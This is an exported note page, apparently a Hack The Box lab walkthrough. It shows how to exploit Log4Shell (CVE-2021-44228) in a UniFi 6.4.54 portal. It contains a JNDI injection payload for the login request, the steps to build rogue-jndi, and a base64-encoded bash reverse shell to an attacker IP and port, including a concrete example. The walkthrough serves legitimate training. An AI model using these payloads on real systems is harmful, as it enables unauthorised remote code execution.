<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>unify</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>unify</h1><br/><p><img src="images/39-1.png" alt="images/39-1.png" /></p><p></p><p>Upon accessing the page using a browser we are presented with the UniFi web portal login page and the</p><p>version number is 6.4.54 . If we ever come across a version number it’s always a great idea to research that</p><p>particular version on Google. A quick Google search using the keywords UniFy 6.4.54 exploit reveals an</p><p>article that discusses the in-depth exploitation of the CVE-2021-44228 vulnerability within this application.</p><p>If you would like to learn more about the Log4J vulnerability we have a great Blog post about it.</p><p></p><p><a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi">https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi</a></p><p><a href="https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation">https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation</a></p><p></p><p></p><p>First, we attempt to login to the page with the credentials test:test as we aren’t trying to validate or gain</p><p>access. The login request will be captured by BurpSuite and we will be able to modify it.</p><p>Before we modify the request, let&#39;s send this HTTPS packet to the Repeater module of BurpSuite by</p><p>pressing CTRL+R .</p><p></p><p>The Exploitation section of the previously mentioned article mentions that we have to input our payload into</p><p>the remember parameter. Because the POST data is being sent as a JSON object and because the payload</p><p>contains brackets {} , in order to prevent it from being parsed as another JSON object we enclose it inside</p><p>brackets &quot; so that it is parsed as a string instead.</p><p></p><p><img src="images/39-2.png" alt="images/39-2.png" /></p><p></p><p>We input the payload into the remember field as shown above so that we can identify an injection point if</p><p>one exists. If the request causes the server to connect back to us, then we have verified that the application</p><p>is vulnerable.</p><p></p><p>${jndi:ldap://{Tun0 IP Address}/whatever}</p><p></p><p></p><p><strong>JNDI</strong> is the acronym for the Java Naming and Directory Interface API . By making calls to this API,</p><p>applications locate resources and other program objects. A resource is a program object that provides</p><p>connections to systems, such as database servers and messaging systems.</p><p></p><p><strong>LDAP</strong> is the acronym for Lightweight Directory Access Protocol , which is an open, vendor-neutral,</p><p>industry standard application protocol for accessing and maintaining distributed directory information</p><p>services over the Internet or a Network. The default port that LDAP runs on is port 389 .</p><p></p><p><img src="images/39-3.png" alt="images/39-3.png" /></p><p></p><p>After we hit &quot;send&quot; the &quot;Response&quot; pane will display the response from the request. The output shows us an</p><p>error message stating that the payload is invalid, but despite the error message the payload is actually being</p><p>executed.</p><p></p><p>Let&#39;s proceed to starting tcpdump on port 389 , which will monitor the network traffic for LDAP connections.</p><p></p><p></p><p>tcpdump is a data-network packet analyzer computer program that runs under a command</p><p>line interface. It allows the user to display TCP/IP and other packets being</p><p>transmitted or received over a network to which the computer is attached.</p><p></p><p>Open up another terminal and type:</p><p>sudo tcpdump -i tun0 port 389</p><p></p><p>The above syntax can be broken down as follows.</p><p></p><p>sudo: Run this via root also known as admin.</p><p>tcpdump: Is the program or software that is <strong>Wireshark</strong> except, it&#39;s a command line version.</p><p>-i: Selecting interface. (Example eth0, wlan, tun0)</p><p>port 389: Selecting the port we are listening on.</p><p></p><p>After tcpdump has been started, click the Send button in burpsuite to send the request aagin. Now we can see response from the server.</p><p></p><p><img src="images/39-4.png" alt="images/39-4.png" /></p><p></p><p></p><p><strong>Foothold:</strong></p><p></p><p>We will have to install Open-JDK and Maven on our system in order to build a payload that we can send to</p><p>the server and will give us Remote Code Execution on the vulnerable system.</p><p></p><p><img src="images/39-5.png" alt="images/39-5.png" /></p><p></p><p>sudo apt-get install maven</p><p></p><p><img src="images/39-6.png" alt="images/39-6.png" /></p><p></p><p>Once we have installed the required packages, we now need to download and build the Rogue-JNDI Java</p><p>application.</p><p></p><p>Let&#39;s clone the respective repository and build the package using Maven.</p><p>git clone <a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a></p><p>cd rogue-jndi</p><p>mvn package</p><p></p><p><img src="images/39-7.png" alt="images/39-7.png" /></p><p></p><p></p><p>This will create a .jar file in rogue-jndi/target/ directory called RogueJndi-1.1.jar . Now we can</p><p>construct our payload to pass into the RogueJndi-1-1.jar Java application.</p><p></p><p>To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for</p><p>giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding</p><p>issues.</p><p></p><p>Creating a Reverse Shell Payload:</p><p></p><p>echo &#39;bash -c bash -i &gt;&amp;/dev/tcp/{Attacker_IP}/{Attacker_Port} 0&gt;&amp;1&#39; | base64</p><p></p><p><img src="images/39-8.png" alt="images/39-8.png" /></p><p></p><p>After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of</p><p>the --command option and your tun0 IP address to the --hostname option.</p><p></p><p>java -jar target/RogueJndi-1.1.jar --command &quot;bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}&quot; --hostname &quot;{Attacker_IP}&quot;</p><p></p><p>For example:</p><p></p><p>java -jar target/RogueJndi-1.1.jar --command &quot;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}&quot; --hostname &quot;10.10.14.33&quot;</p><p></p><p><img src="images/39-9.png" alt="images/39-9.png" /></p><p></p><p>Now that the server is running. We can open a netcat listener at the port specified above. Then return to Burpsuite.</p><p></p><p><img src="images/39-10.png" alt="images/39-10.png" /></p><p></p><p>After sending the request, a connection to our rogue server is received and the following message is shown.</p><p></p><p>Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload</p><p></p><p>Once we receive the output from the Rogue server, a shell spawns on our Netcat listener and we can</p><p>upgrade the terminal shell using the following command.</p><p></p><p>script /dev/null -c bash</p><p></p><p><img src="images/39-11.png" alt="images/39-11.png" /></p></div>
</body>
</html>
